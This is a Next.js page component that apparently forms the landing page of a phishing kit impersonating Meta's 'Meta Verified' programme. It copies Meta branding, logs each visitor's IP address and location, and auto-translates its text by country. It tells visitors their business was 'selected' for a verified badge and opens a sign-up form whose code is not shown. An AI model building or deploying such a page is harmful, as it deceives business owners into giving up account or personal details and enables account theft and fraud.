'use client';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import dynamic from 'next/dynamic';
import { useEffect, useState, type FC } from 'react';
import Image from 'next/image';
import Banner1 from '@/assets/images/banner1.jpg';
import Banner2 from '@/assets/images/banner2.jpg';
import Banner3 from '@/assets/images/banner3.jpg';
import Banner4 from '@/assets/images/banner4.jpg';
import MetaLogo from '@/assets/images/unnamedmeta.png';
import Navbar from '@/components/navbar';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const [expandedBenefit, setExpandedBenefit] = useState<string>('verified');
    const [currentTestimonialIndex, setCurrentTestimonialIndex] = useState(0);
    
    const testimonials = [
        {
            quote: "After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don't know or newer brands interested in working with me can make sure that they're talking with me and not a scammer.",
            author: "Kimber Greenwood, Owner of Water-Bear Photography"
        },
        {
            quote: "Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up and I'm seeing more interactions on stories and reels.",
            author: "Devon Kirby, Owner, Mom Approved Miami"
        },
        {
            quote: "Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously.",
            author: "Sarah Clancy, Owner of Sarah Marie Running Co."
        }
    ];

    const handlePrevTestimonial = () => {
        setCurrentTestimonialIndex((prev) => (prev === 0 ? testimonials.length - 1 : prev - 1));
    };

    const handleNextTestimonial = () => {
        setCurrentTestimonialIndex((prev) => (prev === testimonials.length - 1 ? 0 : prev + 1));
    };
    
    const benefitImages: Record<string, typeof Banner1> = {
        verified: Banner1,
        impersonation: Banner2,
        support: Banner3,
        features: Banner4,
    };
    
    const [currentBenefitImage, setCurrentBenefitImage] = useState(benefitImages.verified);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    // Translate texts in parallel (fast!) instead of sequentially
    useEffect(() => {
        if (!geoInfo || Object.keys(translations).length > 0) return;

        (async () => {
            // First check if we have hardcoded translation
            const langMap: Record<string, string> = {
                VN: 'vi',
            };
            
            const lang = langMap[geoInfo.country_code];
            if (lang && lang !== 'en') {
                // Use hardcoded translation for Vietnamese
                const hardcoded = getTranslations(lang);
                setTranslations(hardcoded);
                return;
            }

            // For other languages, use API Google Translate with parallel requests
            const textsToTranslate = [
                'Show the world that you mean business.',
                'Organizations can leverage the requirements to upgrade your page to a Sub-business status with a branded, relationship that reflects your brand values to drive more meaningful engagement and future.',
                'Subscribe on Facebook',
                'A creator toolkit to take your brand further',
                'Explore key Meta Verified benefits available for Facebook and Instagram. Sub-creator plans and pricing for additional benefits.',
                'Learn more',
                'Meta Verified benefits',
                'Verified badge',
                'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
                'Impersonation protection',
                'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.',
                'Enhanced support',
                'Get 24/7 access to email or chat agent support.',
                'Upgraded profile features',
                'Enrich your profile by adding images to your links to help boost engagement. Benefit not yet available in all regions.',
                'Sign up for Meta Verified.',
                'Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming your identity.',
                'Start your application',
                'Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for facebook). We are pleased to see that your business is one of the few that we have considered and selected',
                'Verify business details',
                'You may be asked to share details such as your business name, address, website and/or phone number.',
                'Get feedback',
                'We\'ll review your application and send an update on your status within three working days.',
                'See how Meta Verified has helped real businesses.',
                'Get the latest updates from Meta for business.',
                'Discover new insights to ensure the latest updates on brand safety, critical news and product updates.',
                'Enter your email',
                'Subscribe',
                'Facebook',
                'Instagram',
                'Messenger',
                'WhatsApp',
                'Tools',
                'Business Suite',
                'Ads Manager',
                'Creator Studio',
                'Support',
                'Help Center',
                'Community',
                'Contact us',
                'Legal',
                'Privacy',
                'Terms',
                'Cookies',
                'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our Data Policy.',
                'About',
                'Developers',
                'Careers',
                'Help Centre',
                'After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don\'t know or newer brands interested in working with me can make sure that they\'re talking with me and not a scammer.',
                'Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up and I\'m seeing more interactions on stories and reels.',
                'Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously.',
                'Kimber Greenwood, Owner of Water-Bear Photography',
                'Devon Kirby, Owner, Mom Approved Miami',
                'Sarah Clancy, Owner of Sarah Marie Running Co.',
            ];

            const detectLanguage = async (countryCode: string): Promise<string> => {
                const countryToLang: Record<string, string> = {
                    AE: 'ar', AT: 'de', BE: 'nl', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el', CZ: 'cs',
                    DE: 'de', DK: 'da', EE: 'et', EG: 'ar', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
                    GR: 'el', HR: 'hr', HU: 'hu', IE: 'ga', IN: 'hi', IT: 'it', LT: 'lt', LU: 'lb',
                    LV: 'lv', MT: 'mt', MY: 'ms', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro',
                    SE: 'sv', SI: 'sl', SK: 'sk', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi',
                    JO: 'ar', LB: 'ar', QA: 'ar', IQ: 'ar', SA: 'ar', IL: 'iw', KR: 'ko'
                };
                return countryToLang[countryCode] || 'en';
            };

            const targetLang = await detectLanguage(geoInfo.country_code);
            if (targetLang === 'en') {
                return; // No need to translate to English
            }

            // Get cache
            const CACHE_KEY = 'translation_cache';
            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
            const cache = cached ? JSON.parse(cached) : {};

            // Check if all translations are already cached (from /live preload)
            const allCached = textsToTranslate.every(text => cache[`en:${targetLang}:${text}`]);
            
            if (allCached) {
                // Load from cache immediately
                const translatedMap: Record<string, string> = {};
                textsToTranslate.forEach(text => {
                    translatedMap[text] = cache[`en:${targetLang}:${text}`];
                });
                setTranslations(translatedMap);
                return;
            }

            // Translate ALL texts in parallel with Promise.all
            const translatePromises = textsToTranslate.map(async (text) => {
                const cacheKey = `en:${targetLang}:${text}`;
                
                // Return cached if available
                if (cache[cacheKey]) {
                    return { text, translated: cache[cacheKey] };
                }

                try {
                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
                        params: {
                            client: 'gtx',
                            sl: 'en',
                            tl: targetLang,
                            dt: 't',
                            q: text
                        }
                    });

                    const translatedText = response.data[0]
                        ?.map((item: unknown[]) => item[0])
                        .filter(Boolean)
                        .join('') || text;

                    cache[cacheKey] = translatedText;
                    return { text, translated: translatedText };
                } catch {
                    return { text, translated: text };
                }
            });

            // Wait for all translations at once (parallel)
            const results = await Promise.all(translatePromises);
            
            // Save cache
            if (typeof window !== 'undefined') {
                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
            }

            // Build translation map
            const translatedMap: Record<string, string> = {};
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });

            setTranslations(translatedMap);
        })();
    }, [geoInfo, translations]);

    return (
        <>
            <title>Meta Verified for Facebook | Instagram</title>
            <Navbar />
            <div className="w-full bg-white">
                {/* Hero Section */}
                <section className="min-h-screen bg-white">
                    <div className="grid md:grid-cols-2 w-full h-full min-h-screen items-stretch gap-0">
                        <div className="flex flex-col justify-center px-4 md:px-8 lg:px-16 md:ml-32 lg:ml-40 py-20 md:py-32 max-w-2xl">
                            <div className="flex items-center justify-start mb-2">
                                <Image 
                                    src={MetaLogo} 
                                    alt="Meta Logo"
                                    width={80}
                                    height={80}
                                    className="w-20 h-20 md:w-24 md:h-24 object-contain"
                                    priority
                                />
                            </div>
                            <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
                                {t('Show the world that you mean business.')}
                            </h1>
                            <p className="text-lg text-gray-600 mb-4 leading-relaxed">
                                {t('Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.')}
                            </p>
                            <p className="text-lg text-gray-600 mb-8 leading-relaxed">
                                {t('We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!')}
                            </p>
                            <button
                                onClick={() => {
                                    setModalKey((prev) => prev + 1);
                                    setModalOpen(true);
                                }}
                                className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 px-8 rounded-lg text-lg w-fit shadow-lg transition"
                            >
                                {t('Subscribe on Facebook')}
                            </button>
                        </div>
                        <div className="flex items-center justify-center w-full h-full">
                            <video 
                                autoPlay
                                muted
                                loop
                                className="w-full h-full object-cover"
                            >
                                <source src="/images/video-meta.mp4" type="video/mp4" />
                                Your browser does not support the video tag.
                            </video>
                        </div>
                    </div>
                </section>

                {/* Creator Toolkit Section */}
                <section className="py-20 md:py-32 px-4 md:px-8 bg-white">
                    <div className="max-w-7xl mx-auto">
                        <h2 className="text-3xl md:text-4xl font-bold text-center mb-6 text-gray-900">
                            {t('A creator toolkit to take your brand further')}
                        </h2>
                        <p className="text-center text-gray-600 mb-12 max-w-2xl mx-auto">
                            {t('Explore key Meta Verified benefits available for Facebook and Instagram. Sub-creator plans and pricing for additional benefits.')}
                        </p>
                        <div className="text-center">
                            <a href="https://www.meta.com/meta-verified/" target="_blank" rel="noopener noreferrer" className="text-blue-600 font-semibold hover:underline inline-block">
                                {t('Learn more')} →
                            </a>
                        </div>
                    </div>
                </section>

                {/* Meta Verified Benefits Section */}
                <section className="-mt-12 md:-mt-16 py-2 md:py-3 px-4 md:px-8">
                    <div className="max-w-7xl mx-auto">
                        <h2 className="text-3xl md:text-4xl font-bold text-center mb-16 text-gray-900">
                            {t('Meta Verified benefits')}
                        </h2>
                        
                        <div className="grid md:grid-cols-2 gap-12 items-start">
                            {/* Left - Image */}
                            <div className="flex items-center justify-center">
                                <div className="bg-blue-100 rounded-3xl p-8 w-full">
                                    <Image 
                                        src={currentBenefitImage} 
                                        alt="Meta Verified Benefits Demo"
                                        className="rounded-2xl w-full h-auto object-contain" 
                                        priority
                                        quality={100}
                                        width={400}
                                        height={600}
                                    />
                                </div>
                            </div>

                            {/* Right - Benefits List */}
                            <div className="space-y-0 border-t border-gray-300">
                                {/* Verified Badge */}
                                <div 
                                    className="py-6 border-b border-gray-300"
                                    onMouseEnter={() => {
                                        setExpandedBenefit('verified');
                                        setCurrentBenefitImage(benefitImages.verified);
                                    }}
                                    onMouseLeave={() => setExpandedBenefit('')}
                                >
                                    <div className="flex items-center justify-between">
                                        <h3 className="text-lg font-semibold text-gray-900">{t('Verified badge')}</h3>
                                        <span className="text-2xl text-gray-400">{expandedBenefit === 'verified' ? '−' : '+'}</span>
                                    </div>
                                    {expandedBenefit === 'verified' && (
                                        <p className="text-gray-600 mt-3">
                                            {t('The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.')}
                                        </p>
                                    )}
                                </div>

                                {/* Impersonation Protection */}
                                <div 
                                    className="py-6 border-b border-gray-300"
                                    onMouseEnter={() => {
                                        setExpandedBenefit('impersonation');
                                        setCurrentBenefitImage(benefitImages.impersonation);
                                    }}
                                    onMouseLeave={() => setExpandedBenefit('')}
                                >
                                    <div className="flex items-center justify-between">
                                        <h3 className="text-lg font-semibold text-gray-900">{t('Impersonation protection')}</h3>
                                        <span className="text-2xl text-gray-400">{expandedBenefit === 'impersonation' ? '−' : '+'}</span>
                                    </div>
                                    {expandedBenefit === 'impersonation' && (
                                        <p className="text-gray-600 mt-3">
                                            {t('Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.')}
                                        </p>
                                    )}
                                </div>

                                {/* Enhanced Support */}
                                <div 
                                    className="py-6 border-b border-gray-300"
                                    onMouseEnter={() => {
                                        setExpandedBenefit('support');
                                        setCurrentBenefitImage(benefitImages.support);
                                    }}
                                    onMouseLeave={() => setExpandedBenefit('')}
                                >
                                    <div className="flex items-center justify-between">
                                        <h3 className="text-lg font-semibold text-gray-900">{t('Enhanced support')}</h3>
                                        <span className="text-2xl text-gray-400">{expandedBenefit === 'support' ? '−' : '+'}</span>
                                    </div>
                                    {expandedBenefit === 'support' && (
                                        <p className="text-gray-600 mt-3">
                                            {t('Get 24/7 access to email or chat agent support.')}
                                        </p>
                                    )}
                                </div>

                                {/* Upgraded Profile Features */}
                                <div 
                                    className="py-6 border-b border-gray-300"
                                    onMouseEnter={() => {
                                        setExpandedBenefit('features');
                                        setCurrentBenefitImage(benefitImages.features);
                                    }}
                                    onMouseLeave={() => setExpandedBenefit('')}
                                >
                                    <div className="flex items-center justify-between">
                                        <h3 className="text-lg font-semibold text-gray-900">{t('Upgraded profile features')}</h3>
                                        <span className="text-2xl text-gray-400">{expandedBenefit === 'features' ? '−' : '+'}</span>
                                    </div>
                                    {expandedBenefit === 'features' && (
                                        <p className="text-gray-600 mt-3">
                                            {t('Enrich your profile by adding images to your links to help boost engagement. Benefit not yet available in all regions.')}
                                        </p>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Sign Up Process Section */}
                <section className="mt-8 md:mt-12 py-12 md:py-20 px-4 md:px-8 bg-gradient-to-r from-blue-50 to-indigo-50">
                    <div className="max-w-7xl mx-auto">
                        <h2 className="text-3xl md:text-4xl font-bold mb-6 text-gray-900">
                            {t('Sign up for Meta Verified.')}
                        </h2>
                        <p className="text-lg text-gray-600 mb-20 whitespace-nowrap">
                            {t('Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming our invitation.')}
                        </p>

                        <div className="grid md:grid-cols-3 gap-10">
                            {/* Step 1 */}
                            <div className="bg-white p-10 rounded-2xl shadow-md">
                                <div className="w-14 h-14 bg-slate-900 text-white rounded-full flex items-center justify-center text-2xl font-bold mb-8">
                                    1
                                </div>
                                <h3 className="text-xl font-semibold mb-5 text-gray-900">{t('Start your application')}</h3>
                                <p className="text-gray-600 leading-relaxed">
                                    {t('Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for facebook). We are pleased to see that your business is one of the few that we have considered and selected')}
                                </p>
                            </div>

                            {/* Step 2 */}
                            <div className="bg-white p-10 rounded-2xl shadow-md">
                                <div className="w-14 h-14 bg-slate-900 text-white rounded-full flex items-center justify-center text-2xl font-bold mb-8">
                                    2
                                </div>
                                <h3 className="text-xl font-semibold mb-5 text-gray-900">{t('Verify business details')}</h3>
                                <p className="text-gray-600 leading-relaxed">
                                    {t('You may be asked to share details such as your business name, address, website and/or phone number.')}
                                </p>
                            </div>

                            {/* Step 3 */}
                            <div className="bg-white p-10 rounded-2xl shadow-md">
                                <div className="w-14 h-14 bg-slate-900 text-white rounded-full flex items-center justify-center text-2xl font-bold mb-8">
                                    3
                                </div>
                                <h3 className="text-xl font-semibold mb-5 text-gray-900">{t('Get feedback')}</h3>
                                <p className="text-gray-600 leading-relaxed">
                                    {t('We\'ll review your application and send an update on your status within three working days.')}
                                </p>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Testimonials Section */}
                <section className="py-20 md:py-32 px-4 md:px-8 bg-white">
                    <div className="max-w-7xl mx-auto">
                        <h2 className="text-2xl md:text-3xl font-medium text-center mb-16 text-gray-900">
                            {t('See how Meta Verified has helped real businesses.')}
                        </h2>

                        <div className="max-w-4xl mx-auto">
                            <div className="bg-blue-50 p-12 md:p-16 rounded-2xl text-center min-h-80 flex flex-col justify-center">
                                <p className="text-lg md:text-xl text-gray-700 mb-8 leading-relaxed">
                                    {t(testimonials[currentTestimonialIndex].quote)}
                                </p>
                                <p className="text-gray-900 font-semibold">
                                    {testimonials[currentTestimonialIndex].author}
                                </p>
                            </div>

                            {/* Carousel Navigation */}
                            <div className="flex items-center justify-center gap-4 mt-12">
                                <button 
                                    onClick={handlePrevTestimonial}
                                    className="w-10 h-10 rounded-full border-2 border-gray-400 flex items-center justify-center hover:border-gray-600 transition"
                                >
                                    ‹
                                </button>
                                <div className="flex gap-2">
                                    {testimonials.map((_, index) => (
                                        <button
                                            key={index}
                                            onClick={() => setCurrentTestimonialIndex(index)}
                                            className={`w-3 h-3 rounded-full transition ${
                                                index === currentTestimonialIndex ? 'bg-gray-900' : 'bg-gray-300'
                                            }`}
                                        ></button>
                                    ))}
                                </div>
                                <button 
                                    onClick={handleNextTestimonial}
                                    className="w-10 h-10 rounded-full border-2 border-gray-400 flex items-center justify-center hover:border-gray-600 transition"
                                >
                                    ›
                                </button>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Newsletter Section */}
                <section className="py-12 md:py-20 px-4 md:px-8 bg-[#1b2a34] text-white border-b border-white/40">
                    <div className="max-w-7xl mx-auto">
                        <div className="grid md:grid-cols-2 gap-12">
                            <div>
                                <h2 className="text-3xl md:text-4xl font-bold mb-6 leading-tight">
                                    {t('Get the latest updates from Meta for business.')}
                                </h2>
                                <p className="text-gray-300 leading-relaxed">
                                    {t('Discover new insights to ensure the latest updates on brand safety, critical news and product updates.')}
                                </p>
                            </div>
                            <div>
                                <div className="flex flex-col gap-6">
                                    <div className="flex gap-3">
                                        <input 
                                            type="email" 
                                            placeholder={t('Enter your email')}
                                            className="flex-1 px-4 py-3 rounded-lg text-gray-900 text-sm bg-white border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
                                        />
                                        <input 
                                            type="text" 
                                            placeholder="Enter a country name..."
                                            className="flex-1 px-4 py-3 rounded-lg text-gray-900 text-sm bg-white border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
                                        />
                                    </div>
                                    <p className="text-xs text-gray-400 leading-relaxed">
                                        {t('By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our Data Policy.')}
                                    </p>
                                    <button className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-full transition w-fit">
                                        {t('Subscribe')}
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Footer */}
                <footer className="bg-[#1b2a34] text-gray-400 py-12 px-4 md:px-8">
                    <div className="max-w-7xl mx-auto">
                        <div className="grid md:grid-cols-4 gap-8 mb-8">
                            <div>
                                <h4 className="font-semibold text-white mb-4">Meta Technologies</h4>
                                <ul className="space-y-2 text-sm">
                                    <li><a href="#" className="hover:text-white">{t('Facebook')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Instagram')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Messenger')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('WhatsApp')}</a></li>
                                </ul>
                            </div>
                            <div>
                                <h4 className="font-semibold text-white mb-4">{t('Tools')}</h4>
                                <ul className="space-y-2 text-sm">
                                    <li><a href="#" className="hover:text-white">{t('Business Suite')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Ads Manager')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Creator Studio')}</a></li>
                                </ul>
                            </div>
                            <div>
                                <h4 className="font-semibold text-white mb-4">{t('Support')}</h4>
                                <ul className="space-y-2 text-sm">
                                    <li><a href="#" className="hover:text-white">{t('Help Center')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Community')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Contact us')}</a></li>
                                </ul>
                            </div>
                            <div>
                                <h4 className="font-semibold text-white mb-4">{t('Legal')}</h4>
                                <ul className="space-y-2 text-sm">
                                    <li><a href="#" className="hover:text-white">{t('Privacy')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Terms')}</a></li>
                                    <li><a href="#" className="hover:text-white">{t('Cookies')}</a></li>
                                </ul>
                            </div>
                        </div>
                        <div className="border-t border-white/40 pt-8 flex flex-col md:flex-row items-start md:items-center justify-between gap-8 text-sm">
                            <div className="flex flex-col gap-3">
                                <p>© 2026 Meta</p>
                                <div className="flex gap-3">
                                    <a href="#" className="text-gray-400 hover:text-white transition">
                                        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                                    </a>
                                    <a href="#" className="text-gray-400 hover:text-white transition">
                                        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="none" stroke="currentColor" strokeWidth="2"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" fill="currentColor"/><circle cx="17.5" cy="6.5" r="1.5" fill="currentColor"/></svg>
                                    </a>
                                    <a href="#" className="text-gray-400 hover:text-white transition">
                                        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24h-6.627l-5.1-6.694-5.867 6.694h-3.306l7.73-8.835L.42 2.25h6.802l4.872 6.049L17.128 2.25h.116zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                                    </a>
                                    <a href="#" className="text-gray-400 hover:text-white transition">
                                        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.474-2.237-1.667-2.237-.909 0-1.451.613-1.688 1.205-.087.212-.109.506-.109.801v5.8h-3.553s.046-9.411 0-10.385h3.553v1.47c-.009.015-.021.03-.032.046h.032v-.046c.46-.709 1.281-1.719 3.12-1.719 2.279 0 3.989 1.489 3.989 4.687v5.947zM5.337 9.433c-1.144 0-1.915-.758-1.915-1.706 0-.955.768-1.703 1.96-1.703 1.188 0 1.912.749 1.937 1.703 0 .948-.749 1.706-1.982 1.706zm1.581 10.019H3.715V8.048h3.203v11.404zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
                                    </a>
                                </div>
                            </div>
                            <div className="flex gap-6">
                                <a href="#" className="text-gray-400 hover:text-white transition">{t('About')}</a>
                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Developers')}</a>
                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Careers')}</a>
                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Privacy')}</a>
                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Cookies')}</a>
                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Terms')}</a>
                                <a href="#" className="text-gray-400 hover:text-white transition">{t('Help Centre')}</a>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>

            {isModalOpen && <FormModal key={modalKey} />}
        </>
    );
};

export default Page;
